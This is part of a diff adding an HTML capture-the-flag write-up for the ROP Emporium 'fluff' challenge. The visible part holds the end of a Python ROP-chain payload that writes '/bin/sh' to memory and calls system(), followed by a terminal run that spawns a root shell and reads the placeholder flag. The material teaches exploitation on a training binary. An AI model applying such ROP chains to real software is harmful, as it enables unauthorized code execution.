+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;3&nbsp;-&nbsp;Write&nbsp;"/bin/sh\x00"&nbsp;to&nbsp;memory</span><br>
+                payload&nbsp;+=&nbsp;mov_pop_pop_xor_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;write&nbsp;"/bin/sh\x00"&nbsp;to&nbsp;memory&nbsp;address</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"C"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r13</span><br>
+                payload&nbsp;+=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x0</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r12</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;4&nbsp;-&nbsp;run&nbsp;system("/bin/sh")</span><br>
+                payload&nbsp;+=&nbsp;pop_rdi_ret<br>
+                payload&nbsp;+=&nbsp;data_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;address&nbsp;of&nbsp;string&nbsp;into&nbsp;rdi</span><br>
+                payload&nbsp;+=&nbsp;system_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;system()</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#payload&nbsp;+=&nbsp;"B"*5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;crash</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-13" name="h2-13"></a><strong></strong>
+        <h2><strong>9) Win!</strong></h2><br>
+        Finally, go win!<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/fluff#&nbsp;(python&nbsp;fluff.py;&nbsp;cat)&nbsp;|&nbsp;./fluff<br>
+                fluff&nbsp;by&nbsp;ROP&nbsp;Emporium<br>
+                64bits<br>
+                <br>
+                You&nbsp;know&nbsp;changing&nbsp;these&nbsp;strings&nbsp;means&nbsp;I&nbsp;have&nbsp;to&nbsp;rewrite&nbsp;my&nbsp;solutions...<br>
+                &gt;&nbsp;id<br>
+                uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)<br>
+                cat&nbsp;flag.txt<br>
+                ROPE{a_placeholder_32byte_flag!}<br>
+                exit<br>
+                exit<br>
+                Segmentation&nbsp;fault
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
